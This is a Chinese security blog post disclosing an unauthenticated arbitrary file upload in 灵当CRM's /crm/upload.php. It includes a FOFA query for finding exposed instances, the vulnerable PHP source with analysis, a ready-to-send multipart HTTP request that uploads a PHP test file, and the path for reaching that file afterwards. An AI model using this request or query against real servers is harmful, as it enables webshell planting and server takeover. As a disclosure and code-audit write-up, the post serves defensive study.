---
title: "灵当CRM /crm/upload.php 文件上传漏洞"
source: https://mrxn.net/jswz/51mis-upload-rce.html
asset_dir: assets/灵当crm-crmupload.php-文件上传漏洞
---

# 灵当CRM /crm/upload.php 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/19 18:06
* 1013浏览
* [0评论](#comment)
* 34分钟阅读

深入探索

CRM

软件

SQL


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

灵当CRM是一款专为中小企业打造的智能[客户关系管理](#)工具，由上海灵当信息科技有限公司开发并运营。广泛应用于金融、教育、医疗、IT服务、房地产等多个行业领域，帮助企业实现客户个性化管理需求，提升企业竞争力。无论是新客户开拓、老客户维护，还是销售过程管理、服务管理等方面，灵当CRM都能提供全面、高效的解决方案。灵当CRM /crm/upload.php 接口存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0 "文件上传")漏洞，未经身份验证的攻击者可通过该漏洞在服务器端写入后门，任执行意代码，获取服务器权限，进而控制整个 web 服务器。

客户关系管理

# 影响版本

# fofa语法

> `body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")`

# 漏洞分析

直接看 /crm/upload.php 业务逻辑实现

```
<?php
/*********************************************************************************
 * diony
 * 上传录音文件
 * 2014-10-21
 ********************************************************************************/
  $http_host=$_SERVER['HTTP_HOST'];
  if(strpos($http_host,"http://")!==false&&strpos($http_host,"http://")<=5)
  {
            $http_host=substr($http_host,strlen("http://"));

  }
 if(strpos($http_host,"https://")!==false&&strpos($http_host,"https://")<=5)
 {
            $http_host=substr($http_host,strlen("https://"));

 }

 if(strpos($http_host,"www.")!==false&&strpos($http_host,"www.")<=5)
 {
            $http_host=substr($http_host,strlen("www."));

 }
 $http_host=trim($http_host);

require_once('includefile.php');
//include('include/database/PearDatabase.php');
//include('include/DatabaseUtil.php');
//header("Content-type: text/html; charset=utf-8");

global $adb;
require_once("Register/RegOp.php");
$Time = date("Ymd");
$regop=RegOp::getInstance();

//$callcenter_interface=$regop->GetcallcenterInterfaceStatus();

if(!file_exists('recordData'))
{
    mkdir('recordData',0777);

}
if(!file_exists('recordData/'.$Time))
{
    mkdir('recordData/'.$Time,0777);
}

if(is_array($_FILES))
{
    $key= key($_FILES);

    $original_name=$_FILES[$key]["name"];
    FileFileterString($original_name);
    if($_FILES[$key]['error'] != UPLOAD_ERR_OK)
    {

        echo "上传失败！";
        exit();
    }
    else
    { 

        if(stripos($_SERVER['HTTP_HOST'],'xiaoshou360.com/XS/penghua')!==false)
        {
            move_uploaded_file($_FILES[$key]['tmp_name'] , "recordData/$Time/$original_name"); 
        }
         else if(stripos($_SERVER['HTTP_HOST'],'xiaoshou360.com/chongwen')!==false)
        {
            move_uploaded_file($_FILES[$key]['tmp_name'] , "recordData/$Time/$original_name"); 
        }
       else  if(strtolower($http_host)=='kehu001.com'||strtolower($http_host)=='51mis.com.cn'||strtolower($http_host)=='xiaoshou360.com')
            {
                //51mis.com.cn/gandan 电话管家上传录音导致服务器卡死

            } 
            else
                     move_uploaded_file($_FILES[$key]['tmp_name'] , "recordData/$Time/$original_name"); 
        include(globalStatic::$root_directory.'modules/Accounts/SaveCallButler.php');

        echo '上传成功！';
    }

}

exit();

?>
```

根据 `$_FILES` 数组获取上传文件，将其保存到指定目录中,无任何过滤处理，导致任意文件上传[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")。

而上传目录 根据一下代码可知

漏洞预警服务

```
$Time = date("Ymd");
if (!file_exists('recordData/' . $Time)) {
    mkdir('recordData/' . $Time, 0777);
}
move_uploaded_file($_FILES[$key]['tmp_name'] , "recordData/$Time/$original_name");
```

最终上传后的文件路径为 /crm/recordData/20241017/test.php 这种格式

# 漏洞复现

```
POST /crm/upload.php HTTP/1.1
Host: 51mis.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123

------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: application/x-php

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundaryABC123--
```

访问文件 /crm/recordData/20241017/test.php

网络安全

[![灵当CRM /crm/upload.php 文件上传漏洞](images/img-001-43147e63343d.webp)](https://image.mrxn.net/b36dd68a03b44419acf52f9001977c76.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[灵当CRM /crm/upload.php 文件上传漏洞](https://mrxn.net/jswz/51mis-upload-rce.html)  
文章链接：<https://mrxn.net/jswz/51mis-upload-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/51mis-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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